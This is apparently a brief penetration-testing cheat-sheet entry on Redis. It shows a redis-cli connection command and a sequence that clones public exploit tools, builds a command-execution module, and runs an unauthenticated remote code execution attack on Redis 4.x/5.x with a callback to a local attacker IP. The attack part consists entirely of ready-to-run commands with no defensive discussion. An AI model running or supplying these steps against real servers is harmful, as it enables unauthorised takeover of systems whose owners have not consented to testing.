# Redis

- Authenticate Redis
```
redis-cli -h 192.168.181.69 -p 6379
```


## Redis 4.x / 5.x - Unauthenticated Code Execution

```
git clone https://github.com/Ridter/redis-rce
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make
python3 redis-rce.py -r <remote-ip> -p <port> -L <local-ip> -f ../RedisModules-ExecuteCommand/module.so
```
